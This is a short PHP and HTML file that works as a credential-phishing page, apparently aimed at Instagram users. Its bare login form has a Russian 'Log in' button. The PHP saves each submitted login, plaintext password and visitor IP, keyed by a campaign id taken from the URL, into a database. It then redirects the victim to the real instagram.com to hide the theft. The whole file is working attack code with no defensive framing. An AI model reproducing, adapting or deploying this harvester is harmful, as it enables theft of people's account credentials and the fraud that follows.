<?php

use \core\Controller;
use \core\Model;

if(isset($_GET['id'])){
    if(isset($_POST['login']) && $_POST['pass']){
        $id = strip_tags(trim($_GET['id']));
        $login = strip_tags(trim($_POST['login']));
        $pass = strip_tags(trim($_POST['pass']));
        $ip = strip_tags($_POST['ip']);

        $stmt = Model::prepare('INSERT INTO accounts VALUES(NULL, ?, ?, ?, ?)');
        $stmt->execute([$id, $login, $pass, $ip]);

        header("Location: https://instagram.com");
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
    <form action="" method="POST">
        <input type="text" name="login">
        <input type="password" name="pass">
        <input type="hidden" name="ip" value="<?= $_SERVER['REMOTE_ADDR'] ?>">
        <input type="submit" value="Войти">
    </form>  
</body>
</html>
